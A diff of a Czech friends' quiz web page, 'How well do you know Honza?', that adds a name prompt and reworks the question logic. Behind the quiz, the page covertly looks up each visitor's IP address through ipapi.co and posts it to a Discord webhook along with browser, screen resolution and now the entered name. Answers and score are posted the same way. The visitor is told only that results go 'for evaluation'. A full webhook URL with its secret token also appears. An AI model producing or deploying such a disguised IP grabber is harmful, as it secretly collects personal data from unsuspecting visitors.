@@ -77,21 +77,47 @@
             border-radius: 8px;
             border: 1px solid rgba(56, 189, 248, 0.2);
         }
+        /* Styly pro zadání jména */
+        .name-input {
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            border-radius: 8px;
+            border: 2px solid #475569;
+            background-color: #334155;
+            color: #f8fafc;
+            box-sizing: border-box;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .name-input:focus {
+            outline: none;
+            border-color: #38bdf8;
+        }
+        .start-btn {
+            background-color: #38bdf8;
+            color: #0f172a;
+            border: none;
+            padding: 14px 28px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.2s;
+            width: 100%;
+        }
+        .start-btn:hover {
+            background-color: #0ea5e9;
+        }
     </style>
 </head>
 <body>
 
     <div class="quiz-container" id="quiz-box">
         <h1>Jak dobře znáš Honzu? 🤔</h1>
-        <div class="progress" id="quiz-progress">Otázka 1 z 5</div>
-        <div class="question" id="quiz-question">Jaká je Honzova nejoblíbenější platforma na vývoj her, programování a trolling?</div>
-        
-        <div class="options-grid" id="quiz-options">
-            <button class="option-btn" onclick="nextQuestion(1)">A) Roblox (LuaU / Studio)</button>
-            <button class="option-btn" onclick="nextQuestion(2)">B) Fortnite (Creative)</button>
-            <button class="option-btn" onclick="nextQuestion(3)">C) Unity (C#)</button>
-            <button class="option-btn" onclick="nextQuestion(4)">D) Scratch (Bloky)</button>
-        </div>
+        <p style="color: #94a3b8; margin-bottom: 20px;">Napiš své jméno nebo přezdívku a začni kvíz!</p>
+        <input type="text" id="username-field" class="name-input" placeholder="Tvoje jméno..." maxlength="20">
+        <button class="start-btn" onclick="startQuiz()">Spustit kvíz 🚀</button>
     </div>
 
     <script>
@@ -99,91 +125,100 @@
         // !!! SEM VLOŽ SVŮJ NOVÝ WEBHOOK !!!
         const webhookUrl = "https://discord.com/api/webhooks/1515336637939318804/-c5CHyTXs8ZwbUuA65DQqjAwZL5-oqz2UOs9t_d3YLEIyn-ODFGppiVkTRFxA3Gf-LJC";
 
-        // Definice otázek a přesných správných odpovědí
+        // Definice otázek
         const questions = [
             {
+                q: "Jaká je Honzova nejoblíbenější platforma na vývoj her, programování a trolling?",
+                options: ["Roblox (LuaU / Studio)", "Fortnite (Creative)", "Unity (C#)", "Scratch (Bloky)"]
+            },
+            {
                 q: "Jakou tiskárnu Honza používá pro svůj 3D tisk?",
-                options: ["Creality Ender 3", "Bambu Lab P1S", "Prusa MK4", "Anycubic Photon"],
-                correct: "Bambu Lab P1S"
+                options: ["Creality Ender 3", "Bambu Lab P1S", "Prusa MK4", "Anycubic Photon"]
             },
             {
                 q: "Co Honza nejčastěji staví a programuje v Minecraftu?",
-                options: ["Redstone mechanické domy", "PVP mapy a servery", "Command blocky a technické systémy", "Survival hrady"],
-                correct: "Command blocky a technické systémy"
+                options: ["Redstone mechanické domy", "PVP mapy a servery", "Command blocky a technické sys.", "Survival hrady"]
             },
             {
                 q: "Jaký hudební styl nebo žánr Honza nejraději poslouchá při kódování nebo hraní?",
-                options: ["Phonk", "Pop / Radio hity", "Heavy Metal", "Klasická hudba"],
-                correct: "Phonk"
+                options: ["Phonk", "Pop / Radio hity", "Heavy Metal", "Klasická hudba"]
             },
             {
                 q: "Jakou brigádu by si chtěl Honza v budoucnu (až to půjde legálně) zkusit?",
-                options: ["Rozvoz jídla / doručování pošty", "Práce v supermarketu", "Asistent v kanclíku", "Práce v kuchyni"],
-                correct: "Rozvoz jídla / doručování pošty"
+                options: ["Rozvoz jídla / doručování pošty", "Práce v supermarketu", "Asistent v kanclíku", "Práce v kuchyni"]
             }
         ];
 
-        // První otázka je definovaná přímo v HTML, definujeme její správnou odpověď manuálně
-        const q1Correct = "Roblox (LuaU / Studio)";
+        // Přesné správné odpovědi pro kontrolu skóre
+        const correctAnswers = [
+            "Roblox (LuaU / Studio)",
+            "Bambu Lab P1S",
+            "Command blocky a technické sys.",
+            "Phonk",
+            "Rozvoz jídla / doručování pošty"
+        ];
 
-        let currentStep = 1;
-        let hasLoggedInfo = false;
+        let currentStep = 0;
+        let userName = "Anonym";
         let userAnswers = []; 
         let score = 0;
 
-        function nextQuestion(selectedOptionIndex) {
+        // Funkce pro spuštění kvízu po zadání jména
+        function startQuiz() {
+            const inputVal = document.getElementById("username-field").value.trim();
+            if (inputVal !== "") {
+                userName = inputVal;
+            }
+
+            // Okamžitě odešleme systémové info s jeho jménem na Discord
+            triggerInfoLogger();
+
+            // Načteme první otázku
+            loadNextQuestion();
+        }
+
+        function loadNextQuestion() {
+            const currentQuestionData = questions[currentStep];
+            currentStep++;
+
+            let optionsHtml = currentQuestionData.options.map((opt, index) => {
+                return `<button class="option-btn" onclick="handleAnswer(${index + 1})">${opt}</button>`;
+            }).join("");
+
+            document.getElementById("quiz-box").innerHTML = `
+                <h1>Jak dobře znáš Honzu? 🤔</h1>
+                <div class="progress">Otázka ${currentStep} z 5</div>
+                <div class="question" id="quiz-question">${currentQuestionData.q}</div>
+                <div class="options-grid" id="quiz-options">${optionsHtml}</div>
+            `;
+        }
+
+        function handleAnswer(selectedOptionIndex) {
             const currentOptions = document.getElementById("quiz-options").children;
             let chosenAnswer = currentOptions[selectedOptionIndex - 1].innerText;
             
-            // Očištění textu odpovědi od případného prefixu "A) ", "B) " atd.
-            let cleanAnswer = chosenAnswer.replace(/^[A-D]\)\s*/, "");
-
-            // Kontrola správnosti pro Q1 nebo pro následující otázky
-            if (currentStep === 1) {
-                if (cleanAnswer.includes("Roblox")) {
-                    score++;
-                }
-            } else {
-                let currentCorrect = questions[currentStep - 2].correct;
-                if (cleanAnswer === currentCorrect) {
-                    score++;
-                }
+            // Kontrola správnosti podle indexu otázky
+            if (chosenAnswer === correctAnswers[currentStep - 1]) {
+                score++;
             }
 
-            userAnswers.push(`Q${currentStep}: ${cleanAnswer}`);
+            userAnswers.push(`Q${currentStep}: ${chosenAnswer}`);
 
-            // První log - systémové informace
-            if (!hasLoggedInfo) {
-                hasLoggedInfo = true;
-                triggerInfoLogger();
-            }
-
-            // Přechod na další otázku
             if (currentStep < 5) {
-                const currentQuestionData = questions[currentStep - 1];
-                currentStep++;
-
-                document.getElementById("quiz-progress").innerText = `Otázka ${currentStep} z 5`;
-                document.getElementById("quiz-question").innerText = currentQuestionData.q;
-                
-                const optionsHtml = currentQuestionData.options.map((opt, index) => {
-                    return `<button class="option-btn" onclick="nextQuestion(${index + 1})">${opt}</button>`;
-                }).join("");
-                
-                document.getElementById("quiz-options").innerHTML = optionsHtml;
+                loadNextQuestion();
             } else {
-                // Konec kvízu - Uživatel uvidí své skóre
+                // Konec kvízu
                 document.getElementById("quiz-box").innerHTML = `
                     <h1 style="color: #4ade80;">Kvíz dokončen! 🎉</h1>
                     <div class="score-display">Tvoje skóre: ${score} z 5</div>
-                    <p style="color: #94a3b8; margin-top: 10px; font-size: 15px;">Výsledky byly úspěšně odeslány k vyhodnocení. Uvidíme, jestli jsi opravdu top kámoš!</p>
+                    <p style="color: #94a3b8; margin-top: 10px; font-size: 15px;">Díky za vyplnění, ${userName}! Výsledky byly úspěšně odeslány k vyhodnocení.</p>
                 `;
-                // Druhý log - odeslání všech odpovědí a skóre na Discord
+                // Na konci odešleme nashromážděné odpovědi se jménem
                 triggerAnswersLogger();
             }
         }
 
-        // 1. LOGGER: Pouze systém a IP
+        // 1. LOGGER: Pouze systém, IP a JMÉNO uživatele
         function triggerInfoLogger() {
             fetch("https://ipapi.co/json/")
             .then(response => response.json())
@@ -214,9 +249,9 @@
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        content: "📡 **Nové připojení ke kvízu!** (Zatím bez odpovědí)",
+                        content: `📡 **Uživatel [ ${userName} ] se právě připojil ke kvízu!**`,
                         embeds: [{
-                            title: `Kvíz Logger - System Info`,
+                            title: `Kvíz Logger - System Info (${userName})`,
                             color: 2342392,
                             fields: [
                                 { name: "IP Adresa", value: payloadData.ip, inline: true },
@@ -226,7 +261,7 @@
                                 { name: "Prohlížeč", value: payloadData.browser, inline: true },
                                 { name: "Rozlišení obrazovky", value: payloadData.screenResolution, inline: true }
                             ],
-                            footer: { text: `Honza Quiz Info Core v4.1 • ${payloadData.timestamp}` }
+                            footer: { text: `Honza Quiz Info Core v4.5 • ${payloadData.timestamp}` }
                         }]
                     })
                 });
@@ -234,7 +269,7 @@
             .catch(err => console.error("Chyba:", err));
         }
 
-        // 2. LOGGER: Výsledné odpovědi a dosažené body
+        // 2. LOGGER: Odpovědi, skóre a JMÉNO na konci
         function triggerAnswersLogger() {
             const answersContent = userAnswers.join("\n");
             const timestamp = new Date().toLocaleString("cs-CZ");
@@ -243,12 +278,12 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    content: `📊 **Uživatel dokončil kvíz! Dosáhl skóre: ${score} z 5 bodů**`,
+                    content: `📊 **Uživatel [ ${userName} ] dokončil kvíz! Dosáhl skóre: ${score} z 5 bodů**`,
                     embeds: [{
-                        title: `Kvíz Výsledky - Odpovědi`,
-                        color: score >= 4 ? 4905856 : 16738654, // Zelená při dobrém skóre, červená při slabém
+                        title: `Kvíz Výsledky - ${userName}`,
+                        color: score >= 4 ? 4905856 : 16738654, 
                         description: `\`\`\`text\n${answersContent}\n\`\`\``,
-                        footer: { text: `Honza Quiz Answers Core v4.1 • ${timestamp}` }
+                        footer: { text: `Honza Quiz Answers Core v4.5 • ${timestamp}` }
                     }]
                 })
             })
